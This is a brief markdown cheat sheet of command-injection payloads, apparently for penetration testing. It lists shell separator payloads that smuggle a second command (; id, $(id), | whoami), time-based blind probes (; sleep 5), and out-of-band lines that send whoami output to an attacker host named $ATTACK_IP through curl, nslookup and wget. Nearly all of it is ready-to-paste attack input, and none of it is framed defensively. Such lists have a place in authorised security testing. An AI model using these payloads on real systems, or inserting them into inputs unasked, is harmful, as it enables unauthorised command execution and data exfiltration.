# Command Injection

## Detection Payloads
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
; sleep 5
| whoami
```

## Blind Command Injection
```bash
# Time-based
; sleep 5

# OOB (Out of Band)
; curl http://$ATTACK_IP/$(whoami)
; nslookup $(whoami).$ATTACK_IP
; wget --post-data="x=$(whoami)" http://$ATTACK_IP/
```

## Injectable Characters
```
;  |  ||  &  &&  `command`  $(command)  %0a  \n
```
